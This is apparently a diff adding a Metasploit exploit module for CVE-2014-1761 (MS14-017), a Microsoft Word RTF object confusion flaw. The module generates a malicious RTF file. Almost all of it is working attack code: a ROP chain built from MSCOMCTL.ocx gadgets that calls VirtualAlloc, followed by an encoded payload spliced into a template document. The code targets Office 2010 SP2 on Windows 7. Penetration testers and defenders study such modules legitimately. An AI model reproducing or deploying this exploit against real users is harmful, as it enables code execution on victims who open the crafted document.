@@ -1,0 +1,116 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::FILEFORMAT
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => "MS14-017 Microsoft Word RTF Object Confusion",
+      'Description'    => %q{
+        This module creates a malicious RTF file that when opened in
+        vulnerable versions of Microsoft Word will lead to code execution.
+        The flaw exists in how a listoverridecount field can be modified
+        to treat one structure as another.
+
+        This bug was originally seen being exploited in the wild starting
+        in April 2014. This module was created by reversing a public
+        malware sample.
+      },
+      'Author'         =>
+        [
+          'Haifei Li', # vulnerability analysis
+          'Spencer McIntyre',
+          'unknown' # malware author
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     => [
+        ['CVE', '2014-1761'],
+        ['MSB', 'MS14-017'],
+        ['URL', 'http://blogs.mcafee.com/mcafee-labs/close-look-rtf-zero-day-attack-cve-2014-1761-shows-sophistication-attackers'],
+        ['URL', 'https://www.virustotal.com/en/file/e378eef9f4ea1511aa5e368cb0e52a8a68995000b8b1e6207717d9ed09e8555a/analysis/']
+      ],
+      'Platform'       => 'win',
+      'Arch'           => ARCH_X86,
+      'Payload'        =>
+        {
+          'StackAdjustment' => -3500,
+          'Space'           => 375,
+          'DisableNops'     => true
+        },
+      'Targets'        =>
+        [
+          # winword.exe v14.0.7116.5000 (SP2)
+          [ 'Microsoft Office 2010 SP2 English on Windows 7 SP1 English',   {  } ],
+        ],
+      'DefaultTarget'  => 0,
+      'Privileged'     => true,
+      'DisclosureDate' => 'Apr 1 2014'))
+
+    register_options(
+      [
+        OptString.new('FILENAME', [ false, 'The file name.', 'msf.rtf'])
+      ], self.class)
+  end
+
+  def exploit
+    junk = rand(0xffffffff)
+    rop_chain = [
+      0x275de6ae, # ADD ESP,0C # RETN [MSCOMCTL.ocx]
+      junk,
+      junk,
+      0x27594a2c, # PUSH ECX # POP ESP # AND DWORD PTR [ESI+64],0FFFFFFFB # POP ESI # POP ECX # RETN [MSCOMCTL.ocx]
+      0x2758b042, # RETN [MSCOMCTL.ocx]
+      0x2761bdea, # POP EAX # RETN [MSCOMCTL.ocx]
+      0x275811c8, # ptr to &VirtualAlloc() [IAT MSCOMCTL.ocx]
+      0x2760ea66, # JMP [EAX] [MSCOMCTL.ocx]
+      0x275e0081, # POP ECX # RETN [MSCOMCTL.ocx]
+      0x40000000,
+      0x00100000,
+      0x00003000,
+      0x00000040,
+      0x00001000,
+      0x275fbcfc, # PUSH ESP # POP EDI # POP ESI # RETN 8 [MSCOMCTL.ocx]
+      junk,
+      0x275e0861, # MOV EAX,EDI # POP EDI # POP ESI # RETN [MSCOMCTL.ocx]
+      junk,
+      junk,
+      junk,
+      junk,
+      0x275ebac1, # XCHG EAX,ESI # NOP # ADD EAX,MSORES+0x13000000 # RETN 4 [MSCOMCTL.ocx]
+      0x275e0327, # POP EDI # RETN [MSCOMCTL.ocx]
+      junk,
+      0x40000000,
+      0x275ceb04, # REP MOVS BYTE [EDI],BYTE [ESI] # XOR EAX,EAX # JMP MSCOMCTL!DllGetClassObject0x3860 [MSCOMCTL.ocx]
+      junk,
+      junk,
+      junk,
+      junk,
+      0x40000040
+    ].pack("V*")
+
+    exploit_data  = [ junk ].pack("v")
+    exploit_data << rop_chain
+    exploit_data << payload.encoded
+    exploit_data << make_nops(exploit_data.length % 2)
+    exploit_data  = exploit_data.unpack("S<*")
+    exploit_data  = exploit_data.map { |word| " ?\\u-#{0x10000 - word}" }
+    exploit_data  = exploit_data.join
+
+    template_part1 = 0x1e04
+    template_path = ::File.join(Msf::Config.data_directory, "exploits", "cve-2014-1761.rtf")
+    template_rtf = ::File.open(template_path, 'rb')
+
+    exploit_rtf  = template_rtf.read(template_part1)
+    exploit_rtf << exploit_data
+    exploit_rtf << template_rtf.read
+
+    file_create(exploit_rtf)
+  end
+end
